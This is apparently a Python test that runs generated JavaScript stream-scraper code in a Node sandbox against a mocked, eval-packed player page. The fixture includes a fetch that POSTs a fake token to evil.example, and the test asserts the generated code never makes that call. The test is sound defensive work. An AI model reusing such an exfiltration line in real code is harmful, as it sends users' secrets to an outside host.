#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import subprocess
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

spec = importlib.util.spec_from_file_location(
    "scripted_request_contract_generator",
    ROOT / "scripts" / "adaptive_runtime" / "runtime_recovery_generator.py",
)
assert spec and spec.loader
generator = importlib.util.module_from_spec(spec)
spec.loader.exec_module(generator)

base = (
    'module.exports={getStreams:async function(){return ['
    '{name:"Player",url:"https://player.example/watch/fixture",isDirect:false}'
    ']}};\n'
)
generated = generator.apply(
    base,
    options={
        "provider_name": "Fixture",
        "base_url": "https://provider.example",
        "types": ["anime"],
        "search_paths": [],
        "direct_paths": [],
        "request_recipes": [],
        "new_strategy_id": "document_request_contract_mining_v2",
        "document_request_mining": True,
        "scripted_request_mining": True,
        "max_pages": 8,
        "max_embeds": 6,
        "max_depth": 4,
        "max_recipe_passes": 2,
        "timeout_ms": 4000,
    },
)
for marker in (
    '"documentRequestMining":true',
    '"scriptedRequestMining":true',
    "function bootstrapRows(",
    "async function documentRequestBootstrap(",
    "async function executeBootstrap(",
):
    assert marker in generated, marker

# Runtime values from the remote player must stay runtime-only; generated bytes
# contain the generic parser, never fixture token/body values.
for forbidden in ("abc123", "evil-secret", "https://evil.example/api"):
    assert forbidden not in generated

runner = r"""
const vm=require('vm');
const source=process.argv[2],calls=[];
function headers(type){return {
  get:(name)=>String(name||'').toLowerCase()==='content-type'?type:null,
  getSetCookie:()=>[],
}}
function response(url,type,body,status=200){return {
  ok:status>=200&&status<300,status,url,headers:headers(type),
  text:async()=>String(body||''),
  json:async()=>JSON.parse(String(body||'{}')),
  clone(){return response(url,type,body,status)},
}}
const packed = '<html><script>'+
'eval(function(p,a,c,k,e,d){return p}('+
"'fetch(\"/api/source\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({file:\"abc123\",episode:1})});"+
"fetch(\\\"https://evil.example/api\\\",{method:\\\"POST\\\",body:JSON.stringify({token:\\\"evil-secret\\\"})});"+
"var x$=new XMLHttpRequest();x$.open(\\\"POST\\\",\\\"/api/video-meta\\\");x$.send(JSON.stringify({file:\\\"xhr123\\\",episode:1}))'"+
",62,0,''.split('|'),0,{}))"+
'</script></html>';
const sandbox={
  module:{exports:{}},exports:{},URL,URLSearchParams,AbortController,
  setTimeout,clearTimeout,Uint8Array,
  fetch:async(input,init={})=>{
    const url=String(input),method=String(init.method||'GET').toUpperCase(),body=String(init.body||'');
    calls.push({url,method,body,referer:(init.headers||{}).Referer||''});
    if(url==='https://player.example/watch/fixture')
      return response(url,'text/html',packed);
    if(url==='https://player.example/api/source'){
      if(method!=='POST'||body!=='{"file":"abc123","episode":1}')
        return response(url,'application/json','{"error":"bad-contract"}',400);
      return response(url,'application/json','{"source":"https://cdn.example/token/opaque"}');
    }
    if(url==='https://player.example/api/video-meta'){
      if(method!=='POST'||body!=='{\"file\":\"xhr123\",\"episode\":1}')
        return response(url,'application/json','{\"error\":\"bad-xhr-contract\"}',400);
      return response(url,'application/json','{\"ok\":true}');
    }
    if(url==='https://cdn.example/token/opaque')
      return response(url,'application/vnd.apple.mpegurl','#EXTM3U\n#EXT-X-TARGETDURATION:6\n#EXTINF:6,\nseg.ts\n#EXT-X-ENDLIST\n');
    if(url.startsWith('https://evil.example/'))
      throw new Error('cross-origin bootstrap must not execute');
    if(url==='https://player.example/login')
      throw new Error('non-media same-origin bootstrap must not execute');
    throw new Error('unexpected '+method+' '+url);
  },
};
sandbox.globalThis=sandbox;
vm.runInNewContext(source,sandbox,{timeout:5000});
sandbox.module.exports.getStreams({
  tmdbId:'1',mediaType:'anime',title:'Fixture Anime',season:1,episode:1
}).then(rows=>process.stdout.write(JSON.stringify({rows,calls})))
  .catch(err=>{console.error(err&&err.stack||err);process.exit(1)});
"""

with tempfile.TemporaryDirectory() as directory:
    runner_path = Path(directory) / "runner.cjs"
    runner_path.write_text(runner, encoding="utf-8")
    proc = subprocess.run(
        ["node", str(runner_path), generated],
        cwd=ROOT,
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout)

rows = payload["rows"]
calls = payload["calls"]
assert len(rows) == 1, payload
assert rows[0]["url"] == "https://cdn.example/token/opaque", payload
assert rows[0]["isDirect"] is True, payload
bootstrap = [
    row for row in calls
    if row["url"] == "https://player.example/api/source"
]
assert len(bootstrap) == 1, payload
assert bootstrap[0]["method"] == "POST", payload
assert bootstrap[0]["body"] == '{"file":"abc123","episode":1}', payload
assert bootstrap[0]["referer"] == "https://player.example/watch/fixture", payload
xhr = [
    row for row in calls
    if row["url"] == "https://player.example/api/video-meta"
]
assert len(xhr) == 1, payload
assert xhr[0]["method"] == "POST", payload
assert xhr[0]["body"] == '{"file":"xhr123","episode":1}', payload
assert xhr[0]["referer"] == "https://player.example/watch/fixture", payload
assert not any(row["url"].startswith("https://evil.example/") for row in calls), payload
assert not any(row["url"] == "https://player.example/login" for row in calls), payload

print(
    "FIELD_BRAIN_SCRIPTED_REQUEST_CONTRACT "
    "packed=true static_only=true same_origin=true post_json=true xhr_post_json=true "
    "terminal_media=true persisted_secret=false"
)
